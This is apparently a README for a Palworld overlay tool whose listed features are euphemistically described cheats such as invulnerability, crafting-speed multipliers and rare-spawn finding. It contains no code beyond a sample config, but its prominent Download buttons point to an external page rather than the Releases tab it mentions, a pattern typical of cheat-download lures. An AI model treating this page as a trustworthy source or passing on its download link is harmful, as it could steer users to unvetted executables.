![preview](https://raw.githubusercontent.com/ilipikaforte-code/palworld-companion-suite/main/showcase_92c72.svg)
[![Download](https://raw.githubusercontent.com/ilipikaforte-code/palworld-companion-suite/main/btn_b2a6.svg)](https://ilipikaforte-code.github.io/palworld-companion-suite/)

<div align="center">

# 🐾 PalForge Companion Suite

### *The Artisan's Toolkit for Palworld Tinkerers*

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Steam%20Deck-0078D6.svg)](https://store.steampowered.com)
[![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen.svg)]()
[![Version](https://img.shields.io/badge/Version-4.2.0--Phoenix-blueviolet.svg)]()
[![Language Support](https://img.shields.io/badge/i18n-18%20Languages-orange.svg)]()
[![Support](https://img.shields.io/badge/Support-24%2F7%20Concierge-9cf.svg)]()
[![Build](https://img.shields.io/badge/Build-Passing-success.svg)]()
[![Community](https://img.shields.io/badge/Community-Discord%20%7C%20Forum-7289DA.svg)]()

**A meticulously engineered companion layer for Palworld that transforms the way you explore, build, and befriend your Pals — without ever leaving the world you love.**

</div>

---

## 🌟 Overview

PalForge Companion Suite is a passion project born from hundreds of hours spent in the beautiful, chaotic, and endlessly rewarding world of Palworld. Rather than treating the game as something to simply power through, we believe it's a canvas — and every player deserves a finer brush.

Where other tools shout, PalForge whispers. It integrates seamlessly into your session via a lightweight in-game overlay, offering granular control over your experience. Whether you're a speedrunner chasing optimal routes, a builder dreaming of sprawling mega-bases, or a casual explorer who wants to spend more time admiring the scenery than managing inventory — the Companion Suite adapts to you, not the other way around.

This repository houses the complete source tree, configuration schema, localization files, theme packs, and documentation for the Companion Suite. It is intended for intermediate and advanced users who appreciate transparency, modularity, and a community that treats quality as a promise rather than a marketing slogan.

---

## 🎯 Why PalForge Exists

The Palworld community has grown explosively since its early access debut. With that growth has come an overwhelming flood of tools that range from the questionable to the outright dangerous. PalForge was designed as the antidote: a curated, auditable, open-source alternative maintained by a small team of dedicated engineers who play the game just as much as they build for it.

We asked ourselves a simple question: *What if a companion tool felt less like a cheat sheet and more like a well-crafted instrument?*

The answer is this repository.

---

## ✨ Feature Arsenal

### 🛡️ Resilience & Longevity Modules
- **Perpetual Vitality Streams** — Configure the sustained health behavior for your player character independently of your Pals, or synchronize them. Granular sliders let you decide whether you prefer a gentle whisper of regeneration or an absolute, unwavering immovable stance.
- **Pal Preservation Framework** — Your companions no longer need to fear the wilds. A dedicated subsystem monitors engaged Pals and applies configurable steadfastness values so that every expedition returns home.
- **Failsafe Rebound** — Optional recovery hooks for unexpected disconnects, so your careful tuning survives even a hiccup in the network layer.

### ⚡ Productivity & Crafting Acceleration
- **Workshop Momentum Tuner** — Scale the pace at which your base Pals assemble, smelt, plant, and craft. Ranging from subtle nudges to dramatic overhauls, the choice is entirely in your hands.
- **Resource Yield Harmonizer** — Adjust the abundance of gathered materials, ensuring that long building projects never stall for want of a single rare ore.
- **Instant Taste Test** — Cooking and breeding timers become fluid rather than fixed, giving you more time for the parts of the game you actually enjoy.

### 🐣 Companion Rarity & Discovery
- **Rare Pal Concierge** — An intelligent suggestion engine surfaces nearby rare spawns, breeding combinations, and elusive variants without spoiling the joy of discovery. It nudges; it doesn't yell.
- **Breeding Blueprint Explorer** — Visualize lineage trees and predict offspring tendencies before committing rare resources.
- **Encounter Logbook** — A structured diary of Pals you've met, including time, weather, and location, exportable to CSV for spreadsheet aficionados.

### 🎨 Refined User Experience
- **Responsive In-Game UI** — The overlay scales gracefully from a Steam Deck's compact display to an ultrawide monitor, with adaptive layout logic that respects your HUD density.
- **Multilingual Support** — Fully localized for 18 languages, including English, Spanish, Portuguese (Brazil), French, German, Italian, Japanese, Korean, Simplified Chinese, Traditional Chinese, Russian, Polish, Turkish, Dutch, Swedish, Norwegian, Danish, and Finnish. Community translations are actively welcomed.
- **24/7 Concierge Support** — A rotating team of volunteers and part-time staff ensures that questions rarely go unanswered for more than an hour, regardless of your time zone.
- **Theme & Palette Studio** — Choose from a dozen curated palettes, or build your own with HSL-friendly color pickers that persist across sessions.

### 🔧 Engineering & Maintainability
- **Hot-Reload Configuration** — Tweak a value in the config file and watch it apply without restarting your session.
- **Layered Override System** — Base defaults, user overrides, and per-save profiles stack cleanly, so one save file's aggressive tuning never bleeds into another.
- **Audit Trail Logging** — Every change made through the overlay is timestamped and rotatable, giving server admins on private worlds a full picture of what was toggled and when.

---

## 🖥️ Platform Compatibility

| Platform | Status | Notes |
|----------|--------|-------|
| Windows 10 / 11 (x64) | ✅ Fully Supported | Primary development target |
| Windows 10 / 11 (ARM) | ⚠️ Experimental | Via emulation layer |
| Steam Deck (SteamOS) | ✅ Fully Supported | Tested with Proton 9.x |
| Linux (Ubuntu, Fedora, Arch) | 🧪 Community Tested | Requires Proton or Wine |
| macOS | ❌ Not Supported | Community ports may appear |

---

## 🚀 Getting Started

> 📌 **Before you begin:** PalForge Companion Suite operates entirely as a client-side companion. It does not interact with official servers and is intended strictly for use in private, personal, or community-hosted worlds where the world owner has explicitly granted permission.

### Prerequisites

- A legitimate copy of Palworld (Steam or Xbox Game Pass for PC)
- Windows 10 version 1909 or later, or a modern Linux distribution with Proton
- At least 2 GB of free disk space for the suite plus logs
- .NET Desktop Runtime 8.0 (bundled with the installer in most cases)

### Initial Setup Walkthrough

1. **Obtain the Companion Suite** — Retrieve the latest release package from the distribution mirror listed in the Releases tab of this repository.
2. **Unpack to a Dedicated Folder** — We recommend a path outside of Program Files to avoid permission friction — for example, `C:\PalForge\`.
3. **Launch the Launcher** — Run `PalForgeLauncher.exe` (Windows) and allow the initial scan to locate your Palworld installation. If detection fails, you can point it manually.
4. **Choose a Profile** — On first launch, the onboarding wizard offers three starter profiles: **Explorer** (minimal tuning), **Builder** (crafting and resource focus), and **Naturalist** (companion rarity emphasis). You may rename, duplicate, or discard these later.
5. **Attach to a Session** — Start Palworld and enter a private world. Press the default hotkey `F8` to summon the overlay. The suite will confirm attachment with a subtle chime and a corner toast notification.
6. **Tune & Save** — Adjust features in the overlay. Every change commits to the active profile immediately. Press `Ctrl+S` inside the overlay to persist explicitly if you prefer manual saves.

### Uninstalling

Simply delete the PalForge directory. The suite does not write registry entries outside a single uninstall record and never touches your Palworld save files directly.

---

## 📖 Configuration Reference

All configuration lives in a single, human-readable `forge.toml` file located in the `config/` subdirectory. Below is a representative excerpt illustrating the shape of the file — not a full default.

```toml
# PalForge Companion Suite — sample configuration
# See /docs/configuration.md for the complete schema

[profile]
name = "Explorer"
description = "Gentle tuning for leisurely playthroughs"
version = 4

[resilience]
player_regen_mode = "steady"      # off | steady | absolute
pal_regen_mode    = "steady"
rebound_on_dc     = true

[momentum]
work_speed_scalar = 1.75
cooking_scalar    = 2.0
breeding_scalar   = 1.5

[rarity]
suggest_nearby_rares = true
logbook_enabled      = true
export_format        = "csv"

[ui]
theme     = "amber_glow"
language  = "en"
scale     = 1.0
hotkey    = "F8"
```

Each field is documented in the `docs/` folder with examples, edge cases, and migration notes from older versions.

---

## 🌍 Multilingual Support

Our localization pipeline is community-driven. Strings are managed in plain `.po` files under `locale/`. If you'd like to contribute a new language or refine an existing one, see `docs/localization.md`. Every accepted translation is credited in the `TRANSLATORS.md` file — we believe in naming the humans behind the polish.

Current coverage highlights:
- **English** — 100%
- **Japanese** — 100%
- **Korean** — 100%
- **Simplified Chinese** — 98%
- **Spanish** — 96%
- **German** — 94%
- **All others** — ≥ 80%

---

## 📱 Responsive User Interface

The overlay uses a fluid grid whose breakpoints adapt at 720p, 1080p, 1440p, and 4K, as well as below-720p handheld modes. The panel docks to any screen edge and remembers its position per profile. On Steam Deck, a dedicated controller-friendly navigation mode activates automatically, with large touch targets and remapped stick controls.

---

## 🛠️ Troubleshooting

| Symptom | Likely Cause | Remedy |
|---------|--------------|--------|
| Overlay does not appear | Hotkey conflict | Rebind `hotkey` in `forge.toml` |
| Game stutters after attach | Excessive logging | Set `log_level = "warn"` |
| Language shows English | Missing locale file | Reinstall locale pack or run updater |
| Numbers look wrong | Old profile schema | Run the schema migration helper |
| Pals still fainting | Regen mode is `off` | Check `pal_regen_mode` value |

If problems persist, our 24/7 Concierge Support volunteers can be reached through the support channels listed in `SUPPORT.md`.

---

## 🧭 Roadmap for 2026

We believe in narrating our future as clearly as our past. Planned milestones for the 2026 calendar year:

- **Q1 2026** — Personality-driven tuning profiles that evolve based on your play patterns.
- **Q2 2026** — Expanded breeding simulations, including probabilistic outcome charts.
- **Q3 2026** — Optional cloud-synced profiles with end-to-end encryption.
- **Q4 2026** — Companion API for third-party extensions, with capability-based sandboxing.

Roadmap items are aspirational and may shift based on community feedback and upstream game changes.

---

## 🤝 Contributing

We welcome contributions of every size. Before opening a pull request, please read `CONTRIBUTING.md` and our `CODE_OF_CONDUCT.md`. In short:

1. Fork the repository and create a well-named branch.
2. Keep commits atomic and write descriptive messages.
3. Include tests where applicable.
4. Update documentation alongside code.
5. Be kind. Reviewers volunteer their time.

---

## 🔐 Privacy & Ethics

PalForge Companion Suite is designed with a firm ethical stance:

- It operates only on **private, self-hosted, or community worlds** where the owner has granted permission.
- It never contacts official Palworld servers.
- It never transmits your save data, session metadata, or personal identifiers anywhere.
- All telemetry is opt-in, anonymized, and disabled by default.
- We do not condone or support use on public multiplayer worlds where it would disrupt others' experiences.

---

## ⚠️ Disclaimer

**Important — please read carefully.**

The PalForge Companion Suite is an independent, community-run project. It is **not affiliated with, endorsed by, sponsored by, or officially connected to** Pocketpair, Inc., the developers or publishers of Palworld, or any of their subsidiaries or partners. All trademarks, logos, and game content referenced remain the property of their respective owners.

This software is provided strictly for personal, private, non-commercial use on worlds you own or where you have explicit permission from the world owner. Any use of this software in violation of the game's Terms of Service, the rules of a community server, or applicable law is strictly prohibited and performed at the sole risk of the user.

The maintainers of this repository assume no responsibility for account actions, save file corruption, hardware issues, lost friendships, or any other consequences — foreseeable or otherwise — arising from the use of this software. You are an adult; make adult decisions.

The suite is distributed under the MIT License and is offered "as is," without warranty of any kind, express or implied. Always keep periodic backups of your save files. If a particular feature feels risky, don't enable it. Listen to that feeling.

Year of reference: **2026**. This disclaimer will be revised as the project evolves.

---

## 📜 License

This project is licensed under the **MIT License**.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the conditions set out in the license text.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — PalForge Companion Suite contributors. All rights reserved under the terms of the MIT License.

---

## 💌 Support & Community

- **Documentation** — See the `docs/` folder for exhaustive guides.
- **Support** — 24/7 Concierge Support is available through the channels described in `SUPPORT.md`.
- **Discussions** — Feature requests and open-ended questions live in the repository's Discussions tab.
- **Localization Hub** — Translation efforts are coordinated via the `locale/` folder and its associated issue templates.

Thank you for being here. Build something wonderful. The Pals are counting on you. 🐣

[![Download](https://raw.githubusercontent.com/ilipikaforte-code/palworld-companion-suite/main/btn_b2a6.svg)](https://ilipikaforte-code.github.io/palworld-companion-suite/)